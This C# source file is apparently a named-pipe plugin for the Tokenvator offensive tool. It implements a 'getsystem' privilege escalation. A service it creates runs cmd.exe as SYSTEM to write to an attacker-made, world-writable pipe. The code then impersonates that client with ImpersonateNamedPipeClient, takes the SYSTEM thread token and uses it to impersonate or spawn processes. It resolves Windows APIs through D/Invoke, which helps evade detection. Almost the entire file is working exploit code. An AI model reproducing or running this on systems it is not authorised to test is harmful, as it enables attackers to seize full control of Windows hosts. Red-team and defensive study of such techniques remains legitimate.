using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Runtime.ExceptionServices;
using System.Security;
using System.Security.AccessControl;
using System.Threading;

using DInvoke.DynamicInvoke;

using Tokenvator.Resources;
using Tokenvator.Plugins.AccessTokens;
using Tokenvator.Plugins.Execution;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;


namespace Tokenvator.Plugins.NamedPipes
{
    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;

    class NamedPipes : IDisposable
    {
        private readonly IntPtr hadvapi32;
        private const string BASE_DIRECTORY = @"\\.\pipe\";
        private static readonly AutoResetEvent waitHandle = new AutoResetEvent(false);

        private delegate bool Create(IntPtr phNewToken, string newProcess, string arguments);

        private Winnt._TOKEN_TYPE tokenType;
        private readonly AccessTokens.AccessTokens accessTokens;

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default Constructor
        /// Converted to D/Invoke GetPebLdrModuleEntry
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        internal NamedPipes()
        {
            hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            accessTokens = new AccessTokens.AccessTokens();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// GetSystem function for when SeDebugPrivilege is not available
        /// No Conversion Required
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        internal bool GetSystem()
        {
            tokenType = Winnt._TOKEN_TYPE.TokenImpersonation;

            if (!_GetSystem())
            {
                return false;
            }

            return accessTokens.ImpersonateUser();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// GetSystem function for when SeDebugPrivilege is not available
        /// No conversions required
        /// </summary>
        /// <param name="command"></param>
        /// <param name="arguments"></param>
        ////////////////////////////////////////////////////////////////////////////////
        internal bool GetSystem(string command, string arguments)
        {
            tokenType = Winnt._TOKEN_TYPE.TokenPrimary;

            if (!_GetSystem())
            {
                return false;
            }

            Create createProcess;
            if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            return createProcess(accessTokens.GetWorkingToken(), command, arguments);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Internal GetSystem function where the magic happens
        /// No conversions required
        /// </summary>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        private bool _GetSystem()
        {
            string pipename = Misc.GenerateUuid(12);

            Thread thread = new Thread(() => _GetPipeToken(pipename));

            using (PSExec psExec = new PSExec())
            {
                if (!psExec.Connect("."))
                {
                    Console.WriteLine("[-] Unable to connect to local service host");
                    return false;
                }
                if (!psExec.Create("%COMSPEC% /c echo " + Misc.GenerateUuid(8) + " > " + BASE_DIRECTORY + pipename))
                    return false;
                if (!psExec.Open())
                    return false;
                thread.Start();
                waitHandle.WaitOne();
                if (!psExec.Start())
                    return false;
                if (!psExec.Stop())
                    return false;
            }

            thread.Join();
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// 
        /// </summary>
        /// <param name="pipeName"></param>
        ////////////////////////////////////////////////////////////////////////////////
        public void GetPipeToken(string pipeName)
        {
            Console.WriteLine("[*] Creating Listener Thread");
            Thread thread = new Thread(() => _GetPipeToken(pipeName));
            thread.Start();
            waitHandle.WaitOne();

            Console.WriteLine("[*] Joining Thread");
            thread.Join();
            Console.WriteLine("[*] Joined Thread");

            accessTokens.ImpersonateUser();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public void GetPipeToken(string pipeName, string command, string arguments)
        {
            Console.WriteLine("[*] Creating Listener Thread");
            Thread thread = new Thread(() => _GetPipeToken(pipeName));
            thread.Start();
            waitHandle.WaitOne();

            Console.WriteLine("[*] Joining Thread");
            thread.Join();
            Console.WriteLine("[*] Joined Thread");

            Create createProcess;
            if (0 == System.Diagnostics.Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            createProcess(accessTokens.GetWorkingToken(), command, arguments);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private bool _GetPipeToken(string pipeName)
        {
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow));
            using (NamedPipeServerStream namedPipe = new NamedPipeServerStream(
                pipeName, 
                PipeDirection.InOut, 2, 
                PipeTransmissionMode.Message, 
                PipeOptions.None, 
                128, 128, pipeSecurity
            ))
            {
                Console.WriteLine("[+] Created Pipe {0}", BASE_DIRECTORY + pipeName);
                waitHandle.Set();
                namedPipe.WaitForConnection();
                Console.WriteLine("[+] Connected to Pipe {0}", pipeName);
                using (var streamReader = new StreamReader(namedPipe))
                {       
                    streamReader.ReadToEnd();

                    ////////////////////////////////////////////////////////////////////////////////
                    // advapi32.ImpersonateNamedPipeClient(namedPipe.SafePipeHandle.DangerousGetHandle())
                    ////////////////////////////////////////////////////////////////////////////////
                    IntPtr hImpersonateNamedPipeClient = Generic.GetExportAddress(hadvapi32, "ImpersonateNamedPipeClient");
                    MonkeyWorks.advapi32.ImpersonateNamedPipeClient fImpersonateNamedPipeClient = (MonkeyWorks.advapi32.ImpersonateNamedPipeClient)Marshal.GetDelegateForFunctionPointer(hImpersonateNamedPipeClient, typeof(MonkeyWorks.advapi32.ImpersonateNamedPipeClient));

                    bool retVal = false;
                    try
                    {
                        retVal = fImpersonateNamedPipeClient(namedPipe.SafePipeHandle.DangerousGetHandle());
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] ImpersonateNamedPipeClient Generated an Exception");
                        Console.WriteLine("[-] {0}", ex.Message);
                        return false;
                            
                    }

                    if (!retVal)
                    {
                        Misc.GetWin32Error("ImpersonateNamedPipeClient");
                        return false;
                    }
                        

                    Console.WriteLine("[+] Impersonated Pipe {0}", pipeName);
                }
            }


            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr hGetCurrentThreadId = Generic.GetExportAddress(hkernel32, "GetCurrentThreadId");
            MonkeyWorks.kernel32.GetCurrentThreadId fGetCurrentThreadId = (MonkeyWorks.kernel32.GetCurrentThreadId)Marshal.GetDelegateForFunctionPointer(hGetCurrentThreadId, typeof(MonkeyWorks.kernel32.GetCurrentThreadId));

            uint threadId = 0;
            try
            {
                threadId = fGetCurrentThreadId();                       
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] GetCurrentThreadId Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (!accessTokens.OpenThreadToken(threadId, Winnt.TOKEN_ALL_ACCESS))
            {
                return false;
            }

            accessTokens.SetWorkingTokenToThreadToken();

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// 
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        internal static void EnumeratePipes()
        {
            string[] pipes = Directory.GetFiles(BASE_DIRECTORY);
            foreach (string pipe in pipes)
            {
                Console.WriteLine(pipe);
            }
        }

        ~NamedPipes()
        {

        }

        public void Dispose()
        {
            accessTokens.Dispose();
        }
    }
}
